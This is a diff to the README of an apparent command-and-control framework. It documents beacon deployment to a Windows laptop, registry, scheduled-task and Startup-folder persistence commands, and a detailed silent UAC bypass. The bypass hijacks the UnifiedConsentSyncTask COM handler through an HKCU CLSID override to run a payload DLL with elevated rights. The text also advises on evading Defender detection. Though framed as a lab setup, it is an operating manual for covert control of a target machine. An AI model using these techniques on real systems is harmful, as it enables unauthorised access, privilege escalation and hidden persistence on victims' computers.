@@ -174,8 +174,23 @@ Commands:
 | `results [sid]` | list results |
 | `kill <sid>` | send a kill directive (beacon exits cleanly) |
 | `sleep <sid> <seconds>` | change the beacon's sleep interval |
+| `uactest <sid> [cmd]` | issue a silent elevation test (`method=daily`) and watch for the result |
+| `uacdll [-SkipBeacon]` | rebuild the UAC payload DLL from `pkg/beacon/uacdll/darts_ucd.c` (then `package -Seed <seed>`) |
 | `watch` | stream live task/result events (`stop` to exit) |
 | `quit` / `exit` | leave |
+
+#### Persistence tasks
+
+`persist` / `unpersist` install or remove logon persistence from the beacon. Parameters: `method` (`reg`, `schtasks`, `startup` — required), `name` (required; registry value / task name / file base name), `cmd` (optional; defaults to a hidden relaunch of the beacon itself).
+
+```sh
+task <sid> persist    method=reg      name=sysaux        # HKCU\...\CurrentVersion\Run
+task <sid> persist    method=schtasks name=sysaux        # needs an elevated beacon (ONLOGON task)
+task <sid> persist    method=startup  name=sysaux        # Startup folder .cmd
+task <sid> unpersist  method=reg      name=sysaux
+```
+
+`reg` and `startup` work from a non-elevated beacon; `schtasks` (ONLOGON trigger) requires elevation — the beacon reports `Access is denied` otherwise. Verify with `reg query HKCU\...\Run /v <name>`, `schtasks /Query /TN <name>`, or the Startup folder.
 
 Scripted (non-interactive) runs work by piping a file of commands into the binary.
 
@@ -193,6 +208,87 @@ docker exec darkarts-minio sh -c 'mc alias set m http://127.0.0.1:9000 darkarts 
 ```
 
 You should see one `server/00000000000000000000` blob (the task) and one `beacon/00000000000000000000` blob (the result) per session under their `sid/` prefixes in MinIO.
+
+## First-time walkthrough (lab host → Windows laptop)
+
+The full zero-to-deployed flow for a Windows lab host (Go + Docker Desktop) and a Windows 11 target laptop. Everything after step 4 runs from the operator console (`lab\console.cmd`).
+
+### 1. Prerequisites
+
+- **Lab host:** Go 1.26+ (`C:\Program Files\Go\bin\go.exe` — the lab scripts hardcode this path), Docker Desktop (WSL2) with the compose plugin, git. w64devkit (`C:\Users\<you>\w64devkit`) only if you ever rebuild the UAC payload DLL from C.
+- **Target laptop:** Windows 11 **24H2+** for the zero-prompt daily UAC channel (`method=daily`); on Win10 only the one-time-prompt `method=schtasks` path works.
+
+### 2. Clone and build
+
+```powershell
+git clone <your-repo-url> "C:\Users\<you>\Dark Arts"
+cd "C:\Users\<you>\Dark Arts"
+go build ./...
+```
+
+### 3. Start the lab
+
+```powershell
+lab\start-lab.cmd
+```
+
+Brings up server, edge, relay, minio, DNS, victims, tunnel and waits for `http://127.0.0.1:9002/healthz` and `http://127.0.0.1:7443/healthz` to answer `ok`.
+
+### 4. Open the console
+
+```powershell
+lab\console.cmd
+```
+
+### 5. Build + register the laptop package
+
+```
+dark-arts> package
+```
+
+One command: fresh identity, auto-detected LAN edge, `lab\laptop-pkg\beacon.exe` built (self-contained — UAC payload DLL embedded, 15 s sleep, sleep-mask on), session registered. It prints the **seed** (reuse with `package -Seed <seed>`) and the **sid**.
+
+### 6. Deploy to the laptop (the only physical step)
+
+Copy `lab\laptop-pkg\beacon.exe` to the laptop and double-click it (no console window, no env vars, single instance). Wait ~15 s, then:
+
+```
+dark-arts> sessions          # the laptop's sid shows a recent last-seen
+```
+
+### 7. Test the silent UAC elevation channel
+
+```
+dark-arts> uactest <sid>
+```
+
+First result waits for the stock Windows `UnifiedConsentSyncTask` daily fire (12:00±2h, or at wake-up) that bootstraps the channel; the console prints the on-laptop verification checklist if it times out. After the first fire, every `uac` command returns in seconds, fully silent:
+
+```
+dark-arts> uactest <sid>                 # whoami /groups elevated
+dark-arts> task <sid> uac cmd=net user
+```
+
+One-time-prompt fallback: `task <sid> uac method=schtasks cmd=whoami /groups`.
+
+### 8. Routine operation
+
+```
+dark-arts> task <sid> shell cmd=whoami
+dark-arts> results
+dark-arts> watch                        # live events; "stop" to exit
+dark-arts> sleep <sid> 60
+dark-arts> task <sid> persist method=reg name=sysaux
+dark-arts> kill <sid>
+```
+
+### 9. Teardown
+
+```powershell
+lab\stop-lab.cmd        # or: docker compose -f lab/docker-compose.yml down -v
+```
+
+To un-arm the daily channel on a laptop: delete the HKCU CLSID override key, `%TEMP%\darts_ucd.dll`, `%TEMP%\darts-uac-work.txt`, and `schtasks /Delete /TN \DarkArts-uac /F`.
 
 ## Deploying to a Windows laptop
 
@@ -231,6 +327,18 @@ dark-arts> task <sid> shell cmd=whoami
 dark-arts> results              # watch for the base64 result
 dark-arts> kill <sid>
 ```
+
+### Silent elevation (`uac`) — the zero-prompt daily channel
+
+The `uac` task runs a command with a full elevated token. The default method (`daily`) is **fully silent — no UAC prompt ever**:
+
+- **Mechanism:** the stock Win11 24H2+ `UnifiedConsentSyncTask` (`\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`) is a Group/BA, `HighestAvailable`, non-idle-gated task with a daily `TimeTrigger` (12:00±2h, `StartWhenAvailable` — also fires at wake-up) that runs **in the interactive user's session** and activates its ComHandler CLSID `{82AA0895-198A-4C1B-B2D1-C16894218AFB}` at HIGH. The beacon drops a payload DLL at `%TEMP%\darts_ucd.dll` and points the **HKCU override** for that CLSID at it (HKLM still owns the real handler, so scheduler validation passes, but user-session activation consults HKCU first — verified live in the lab). On each daily fire the DLL loads at HIGH, bootstraps the reusable `\DarkArts-uac` HIGHEST task (InteractiveToken, no triggers, hidden), and runs the pending command; it then returns `REGDB_E_CLASSNOTREG`, so the host reports a benign activation failure.
+- **First invocation** arms the channel and waits up to ~26h for the next fire (the beacon's task loop is busy meanwhile). **After the first fire the reusable task exists and every `uac` command returns in ~2–5 s** via a silent `schtasks /run`.
+- **Fallbacks:** `method=schtasks` (one-time ShellExecute `runas` prompt, then silent forever), plus the classic `cmluautil`/`fodhelper`/`computerdefaults` methods.
+- **Verify on the laptop after a fire:** `type %TEMP%\uc_daily_marker.txt` (`il=1` lines = loaded at HIGH, last line `done`), `schtasks /query /tn \DarkArts-uac`, `reg query "HKCU\Software\Classes\CLSID\{82AA0895-198A-4C1B-B2D1-C16894218AFB}\InprocServer32"` (→ `%TEMP%\darts_ucd.dll`).
+- **Console automation:** `uactest <sid> [cmd]` issues the task and watches for the result (prints the checklist + troubleshooting if the first fire hasn't happened yet); `uacdll` recompiles the payload from `pkg/beacon/uacdll/darts_ucd.c` when it changes (then `package -Seed <seed>` to bake it in).
+- **Caveats:** requires Win11 24H2+ (no `UnifiedConsentSyncTask` on Win10 — use `method=schtasks`); the laptop user must be logged on; Defender must not flag the DLL (rebuild from a clean gcc if it does; keep the DLL out of Go c-shared builds — those get ML-flagged).
+- **Teardown:** delete the HKCU override key, `%TEMP%\darts_ucd.dll`, `%TEMP%\darts-uac-work.txt`, and the `\DarkArts-uac` task.
 
 ## Cross-network deployment (VPS redirector)
 
